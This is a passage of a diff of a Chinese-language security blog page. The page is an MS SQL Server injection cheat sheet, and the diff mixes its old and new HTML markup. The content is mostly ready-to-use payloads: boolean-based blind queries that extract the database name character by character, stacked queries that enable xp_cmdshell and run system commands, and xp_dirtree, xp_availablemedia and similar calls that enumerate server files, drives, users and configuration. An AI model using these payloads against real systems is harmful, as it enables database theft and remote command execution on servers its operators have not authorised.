+<img src=/img/post/20180904-113720.png alt=75></p></li></ul><h3 id=0x02-boolean-based-blind-注入>0x02 boolean-based blind 注入</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>substring</span>(db_name(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>)<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#75715e>--
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>substring</span>(db_name(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>)<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;b&#39;</span> <span style=color:#75715e>--
+</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 转换为数字
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> unicode(<span style=color:#66d9ef>substring</span>((<span style=color:#66d9ef>select</span> db_name()),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>88</span> <span style=color:#75715e>--
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> ascii(<span style=color:#66d9ef>substring</span>((<span style=color:#66d9ef>select</span> db_name()),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>))<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>88</span> <span style=color:#75715e>--
+</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 转换为16进制
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> (<span style=color:#66d9ef>select</span> master.dbo.fn_varbintohexstr(<span style=color:#66d9ef>CONVERT</span>(varbinary(<span style=color:#ae81ff>30</span>),(<span style=color:#66d9ef>substring</span>(db_name(),<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>1</span>)))) <span style=color:#66d9ef>from</span> master..sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>) <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>in</span> (<span style=color:#e6db74>&#39;0x7400&#39;</span>)
+</span></span></code></pre></div><h3 id=0x03-stacked-注入>0x03 Stacked 注入</h3><ul><li>执行系统命令</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#判断xp_cmdshell是否被删除</span>
+</span></span><span style=display:flex><span>?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> and 1<span style=color:#f92672>=(</span><span style=color:#66d9ef>select</span> count<span style=color:#f92672>(</span>*<span style=color:#f92672>)</span> from master.dbo.sysobjects where xtype <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x&#39;</span> and name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#开启xp_cmdshell</span>
+</span></span><span style=display:flex><span>?id<span style=color:#f92672>=</span>1;exec sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>,1;reconfigure;exec sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>,1;reconfigure;--
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#使用xp_cmdshell执行命令</span>
+</span></span><span style=display:flex><span>exec master..xp_cmdshell <span style=color:#e6db74>&#39;whoami&#39;</span>;
+</span></span></code></pre></div><ul><li>文件操作</li></ul><pre tabindex=0><code>#列目录、文件
 exec master..xp_dirtree &#39;c:\wwwroot&#39;,1 #列c:\wwwroot下的文件夹 
 exec master..xp_dirtree &#39;c:\wwwroot&#39;,1,1 #列c:\wwwroot下的文件夹和文件
 
@@ -194,10 +81,7 @@ exec master..xp_subdirs &#39;c:\wwwroot&#39; #列c:\wwwroot下的文件夹
 
 #显示系统可用盘符
 exec master..xp_availablemedia
-</code></pre><ul>
-<li>主机、中间件信息</li>
-</ul>
-<pre tabindex="0"><code>#获得MS SQL的版本号
+</code></pre><ul><li>主机、中间件信息</li></ul><pre tabindex=0><code>#获得MS SQL的版本号
 exec master..sp_msgetversion
 
 #列出服务器上所有windows本地用户组
@@ -208,35 +92,12 @@ exec master..xp_getnetname
 
 #服务器安全模式信息
 exec master..xp_loginconfig
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
